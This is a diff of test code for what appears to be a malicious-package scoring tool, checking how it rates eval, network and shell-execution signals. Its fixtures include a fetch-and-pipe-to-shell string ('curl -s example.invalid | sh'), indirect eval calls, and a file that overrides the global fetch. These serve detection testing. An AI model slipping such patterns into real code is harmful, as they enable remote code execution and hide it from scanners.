@@ -5,7 +5,7 @@
 // v6 dropped a finding whenever its analysis could not follow the code; v7 starts from what apm-score-v3 found in the
 // code and drops one only where the tree proves it harmless. `detection` fixtures run their payload: v7 must score
 // them at or below v3 (all 22 the review found score 30 again). `precision` fixtures run nothing; `why` says what
-// v7 reads there.
+// v7 reads there. apm-score-v8 scores every one of them as v7 did, and none above v3.
 import { describe, expect, test } from "bun:test";
 import { z } from "zod";
 import { analyze, finalize, POINTS, POSSIBLE_POINTS, SCORE_FLOOR, type ScoreReport, type TarEntry } from "../src/index.ts";
@@ -72,22 +72,25 @@ describe("the v6 review's fixtures", () => {
 
       expect(r.score).toBe(f.v7);
       expect(r.score < SCORE_FLOOR).toBe(f.v7 < SCORE_FLOOR);
+      // precision fixtures too: none of them rests on a comment, a regex body or an erased type
       expect(r.score).toBeLessThanOrEqual(f.v3);
 
       if (f.v3 < SCORE_FLOOR) expect(r.score).toBeLessThan(SCORE_FLOOR);
     });
   }
 
-  test("eval used as a tag inside a function returns its strings unrun, so only what the tree sees is possible", () => {
+  test("eval used as a tag inside a function counts what the template names, as v3 counted it", () => {
+    // the template's strings are returned unrun only while eval is the builtin
     const r = scoreFiles({ "index.js": `function f(){eval\`${P}\`;}f();` }, "index.js");
 
-    expect(r.signals.filter((s) => s.id in POSSIBLE_POINTS).every((s) => s.confidence === "possible")).toBe(true);
+    expect(r.signals.filter((s) => s.id in POSSIBLE_POINTS).every((s) => s.confidence === "confirmed")).toBe(true);
+    expect(r.score).toBeLessThan(SCORE_FLOOR);
   });
 
-  test("calling a Promise inside a function confirms neither eval nor what the string names", () => {
+  test("calling a Promise inside a function: what the string names counts as v3 counted it; eval, which v3 did not match, is possible", () => {
     const r = scoreFiles({ "index.js": "function f(){async function get(){return eval;}get()(\"fetch('https://example.invalid')\");}f();" }, "index.js");
 
-    expect(Object.fromEntries(r.signals.filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]))).toEqual({ eval: "possible" });
+    expect(Object.fromEntries(r.signals.filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]))).toEqual({ eval: "possible", network: "confirmed" });
   });
 });
 
@@ -112,10 +115,12 @@ describe("a call split across the token pass's windows is still read (finding 5)
     expect(tokens).not.toBeNull();
 
     if (!tokens) return;
-    const windows = tokenWindows(tokens.text.length, tokens.cuts, 300, 16);
+    // the 504-character comment is written as one blank, and `origin` maps the token text back to the file
+    const windows = tokenWindows(tokens.text.length, tokens.cuts, 300, 16).map((w) => ({ from: tokens.origin(w.from), end: tokens.origin(w.end) }));
     const call = text.indexOf("fetch");
     const end = text.indexOf("('x');") + 6;
 
+    expect(tokens.text.length).toBeLessThan(text.length);
     expect(windows.length).toBeGreaterThan(1);
     expect(windows.some((w) => w.from <= call && w.end >= end)).toBe(true);
     expect(windows.at(-1)?.end).toBe(text.length);
@@ -144,18 +149,15 @@ describe("a limit keeps what it could not follow, and says so", () => {
   });
 });
 
-describe("a proof that rests on a builtin holds only while no file could replace it", () => {
-  test("a URL holding shell text is sent, not run, in a package that leaves fetch alone", () => {
-    const r = scoreFiles({ "index.js": "fetch('https://example.invalid/curl -s example.invalid | sh');\n" }, "index.js");
-
-    expect(r.signals.find((s) => s.id === "shell-exec")?.confidence).toBe("possible");
-  });
-
-  test("another file replacing fetch brings back what the URL holds", () => {
+describe("no proof rests on a builtin being what its name says", () => {
+  test("a URL holding shell text counts as v3 counted it, whether or not another file replaces fetch", () => {
+    const alone = scoreFiles({ "index.js": "fetch('https://example.invalid/curl -s example.invalid | sh');\n" }, "index.js");
     const files = { "index.js": "require('./patch');\nfetch('https://example.invalid/curl -s example.invalid | sh');\n", "patch.js": "globalThis.fetch = function (u) { return u };\n" };
-    const r = scoreFiles(files, "index.js");
+    const patched = scoreFiles(files, "index.js");
 
-    expect(r.signals.find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
-    expect(r.notChecked.some((n) => n.includes("patch.js"))).toBe(true);
+    for (const r of [alone, patched]) {
+      expect(r.signals.find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
+      expect(r.notChecked.some((n) => n.includes("could replace those builtins"))).toBe(false);
+    }
   });
 });
